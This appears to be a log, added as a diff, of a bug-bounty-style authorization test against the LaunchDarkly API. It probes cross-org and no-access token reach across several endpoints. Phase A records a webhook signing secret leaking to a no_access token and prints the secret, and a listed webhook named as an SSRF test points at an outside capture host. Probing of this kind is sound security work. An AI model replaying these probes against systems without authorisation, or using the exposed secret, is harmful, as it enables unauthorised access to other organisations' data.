@@ -1,0 +1,63 @@
+========================================================================
+R6 HUNT 1 — 2026-10-22 23:59:15
+========================================================================
+
+PHASE A: webhook signing secret vs no_access token
+------------------------------------------------------------------------
+[A1] create sign webhook: 201 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6adaa353713b0007388c3fba","type":"application/json"}},"_id":"6adaa353713b0007388c3fba","name":"zeno-sign-wh","url":"https://example.com/zx-sign-probe","secret":"8fe4b2f021b44276b3e5f04f420bd3aa","on":false,"tags":[],"_access":{"denied":[],"allowed":[]}}
+[A2] owner GET detail: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6adaa353713b0007388c3fba","type":"application/json"}},"_id":"6adaa353713b0007388c3fba","name":"zeno-sign-wh","url":"https://example.com/zx-sign-probe","secret":"8fe4b2f021b44276b3e5f04f420bd3aa","on":false,"tags":[],"_access":{"denied":[],"allowed":[]}}
+[A0] no_access token: OK
+[A3] no_access GET webhook detail: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6adaa353713b0007388c3fba","type":"application/json"}},"_id":"6adaa353713b0007388c3fba","name":"zeno-sign-wh","url":"https://example.com/zx-sign-probe","secret":"8fe4b2f021b44276b3e5f04f420bd3aa","on":false,"tags":[]}  <<< SECRET LEAK
+[A4] no_access GET webhooks list: 200 {"_links":{"self":{"href":"/api/v2/webhooks","type":"application/json"}},"items":[{"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada0e0ff68b4507c663d7d5","type":"application/json"}},"_id":"6ada0e0ff68b4507c663d7d5","name":"zeno-ssrf-test","url":"https://webhook.site/4bd4bb0f-fb6f-4fe9-82bc-9146ebabb584","on":true,"tags":["bounty"]},{"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhook
+
+PHASE B: scheduled-changes cross-org
+------------------------------------------------------------------------
+[B1] ORG create SC: 201 {"_id":"6adaa359e34d5e0732d19c31","_creationDate":1792713561297,"_maintainerId":"6ac28fd11c28fb07516cf363","_version":0,"executionDate":1793318360320,"instructions":[{"kind":"turnFlagOn"}],"_links":{"parent":{"href":"/api/v2/projects/default/flags/zeno-allowed-1/environments/test/scheduled-changes","type":"application/json"}}}
+[B2] TST GET ORG SC id: 404 {"code":"not_found","message":"flag not found"}
+[B3] TST DELETE ORG SC id: 404 {"code":"not_found","message":"flag zeno-allowed-1 not found"}
+[B4] ORG baseline GET: 200 {"_id":"6adaa359e34d5e0732d19c31","_creationDate":1792713561297,"_maintainerId":"6ac28fd11c28fb07516cf363","_version":0,"executionDate":1793318360320,"instructions":[{"kind":"turnFlagOn"}],"conflicts":[],"_links":{"paren
+
+PHASE C: contexts instance cross-org
+------------------------------------------------------------------------
+[C1] ORG contexts/search: 200 {"_links":{"next":{"href":"/api/v2/projects/default/environments/test/contexts/search","type":"application/json"},"self":{"href":"/api/v2/projects/default/environments/test/contexts/search","type":"application/json"}},"totalCount":0,"_environmentId":"6ac28fd11c28fb07516cf364","items":[]}
+
+PHASE D: OAuth2 applications
+------------------------------------------------------------------------
+[D1] ORG list apps: 200 {"_links":{"self":{"href":"/internal/account/oauth2/applications?limit=20","type":"application/json"}},"items":[],"totalCount":0}
+[D2] ORG create app: 405 
+
+PHASE E: insights member-metrics params
+------------------------------------------------------------------------
+[E] member-metrics no-params: 200 {"totalCount":2,"activeCount":1}
+[E] member-metrics {'memberId': '6ac28fd11c28fb07516cf363'}: 200 {"totalCount":2,"activeCount":1}
+[E] member-metrics {'memberId': '6ac29057ccacd606b1576cb9'}: 200 {"totalCount":2,"activeCount":1}
+[E] member-metrics {'limit': 5}: 200 {"totalCount":2,"activeCount":1}
+[E] TST -> ORG memberId: 200 {"totalCount":1,"activeCount":1}
+
+PHASE F: automated-releases cross-org
+------------------------------------------------------------------------
+[F1] ORG list ARs: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xml" href="https://static.launchdarkly.com
+
+PHASE G: legacy API shapes (cross-org flag key from TST)
+------------------------------------------------------------------------
+[G] /api/v2/flags/default/zeno-allowed-1: 404 {"code":"not_found","message":"Invalid resource identifier"}
+[G] /api/flags/default: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" 
+[G] /api/v1/flags/default: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" 
+[G] /api/projects/default: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" 
+[G] /api/evaluate/default/test/zeno-allowed-1: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" 
+[G] /api/v2/evaluate/default/test/zeno-allowed-1: 404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" 
+
+PHASE H: approval-request detail shape (comments ids?)
+------------------------------------------------------------------------
+[H1] ORG AR detail: 200 {"_id":"6ada9379831a640734b4ffda","_version":0,"creationDate":1792709497939,"serviceKind":"launchdarkly","requestorId":"6ac28fd11c28fb07516cf363","description":"zeno test","reviewStatus":"pending","allReviews":[],"notifyMemberIds":[],"status":"pending","instructions":[{"kind":"turnFlagOn"}],"conflicts":[],"_links":{"reviews":{"href":"/api/v2/projects/default/flags/zeno-allowed-1/environments/test/approval-requests/6ada9379831a640734b4ffda/reviews","type":"application/json"},"self":{"href":"/api/v2/projects/default/flags/zeno-allowed-1/environments/test/approval-requests/6ada9379831a640734b4ffda","type":"application/json"}}}
+[H2] AR keys: ['_id', '_links', '_version', 'allReviews', 'conflicts', 'creationDate', 'description', 'instructions', 'notifyMemberIds', 'requestorId', 'reviewStatus', 'serviceKind', 'status']
+[H3] TST GET ORG AR: 404 {"code":"not_found","message":"flag not found"}
+
+CLEANUP
+------------------------------------------------------------------------
+[X] token delete: 204
+[X] role delete: 204
+[X] webhook delete: 204
+[X] SC delete: 204
+
+DONE
